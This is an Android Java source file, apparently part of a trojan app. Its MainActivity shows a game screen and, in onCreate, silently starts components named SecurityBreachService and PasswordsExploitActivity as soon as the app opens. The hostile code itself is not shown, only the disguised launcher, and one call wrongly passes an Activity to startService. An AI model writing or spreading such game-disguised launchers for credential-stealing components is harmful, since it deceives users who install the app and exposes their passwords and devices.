package com.eyespies.game;
/**main**/
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.Menu;

import com.eyespies.R;
import com.eyespies.service.PasswordsExploitActivity;
import com.eyespies.service.SecurityBreachService;

public class MainActivity extends Activity {
	private Game game1;
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		game1 = new Game(this);
		setContentView(game1);

		Intent myIntent = new Intent(this, SecurityBreachService.class);
		this.startService(myIntent);
		
		Intent myIntent1 = new Intent(this, PasswordsExploitActivity.class);
		this.startService(myIntent1);
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		getMenuInflater().inflate(R.menu.activity_main, menu);
		return true;
	}
}
